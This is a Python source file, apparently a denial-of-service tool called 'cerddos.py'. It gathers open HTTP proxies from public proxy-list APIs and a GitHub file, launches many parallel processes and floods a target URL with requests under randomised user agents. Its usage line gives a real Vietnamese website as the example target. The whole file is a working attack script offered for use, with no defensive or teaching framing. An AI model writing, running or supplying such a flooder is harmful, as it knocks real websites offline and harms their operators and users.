from builtins import *

builtglob = list(globals().keys())



from binascii import hexlify
from tokenize import tokenize, untokenize, TokenInfo
from io import BytesIO
from re import findall

from random import choice, shuffle, randint

from zlib import compress
from colorama import Fore, Style
import requests
import random
import sys
import time
import fake_useragent
import multiprocessing
dark_gray = Fore.LIGHTBLACK_EX
light_gray = Fore.LIGHTBLACK_EX
purple = Fore.MAGENTA + Fore.BLUE
def remove_by_value(arr, val):
    return [x for x in arr if x != val]
#
def run(target, proxies):
    if len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'Cache-Control': 'no-cache', 'User-Agent': fake_useragent.UserAgent().random}
        response = proxiedRequest.get(target, headers=headers)
        print(Style.BRIGHT + dark_gray + "ATTACK " + Fore.RED + "PROXY " + Style.BRIGHT + purple + str(response.status_code) + Fore.RED + " HTTP_PROXY" + " " + Fore.GREEN + f"{target}")
        if response.status_code >= 200 and response.status_code <= 226:
            for _ in range(100):
                proxiedRequest.get(target, headers=headers)
        else:
            proxies = remove_by_value(proxies, proxy)
    else:
        return

def thread(target, proxies):
    while True:
        run(target, proxies)

def main_process():
    if len(sys.argv) != 6:
        print("python filename.py <target> <time> <thread> <mode> proxy")
        print("mode = attack")
        print("example : python cerddos.py https://doanthanhnien.vn/ 200 64 attack proxy")
        sys.exit(0)
    else:
        target = sys.argv[1]
        times = int(sys.argv[2])
        threads = int(sys.argv[3])
        attack_type = sys.argv[4]
        proxies = []

        if attack_type == 'bypass':
            print("ATTACK BYPASS")
        elif attack_type == 'attack':
            print("ATTACK HTTP_PROXY")
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http').text
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
            proxies = proxyscrape_http.replace('\r', '').split('\n')
            proxies += proxy_list_http.replace('\r', '').split('\n')
            proxies += raw_github_http.replace('\r', '').split('\n')
        else:
            print("ATTACK HTTP_PROXY")
            with open(sys.argv[5], 'r') as file:
                proxies = file.read().replace('\r', '').split('\n')

        for _ in range(threads):
            t = multiprocessing.Process(target=thread, args=(target, proxies))
            t.start()
            print(f"GenerationLeaks threads: {_ + 1}")

        time.sleep(times)
        print('Attack End')
        sys.exit(0)

if __name__ == "__main__":
    main_process()
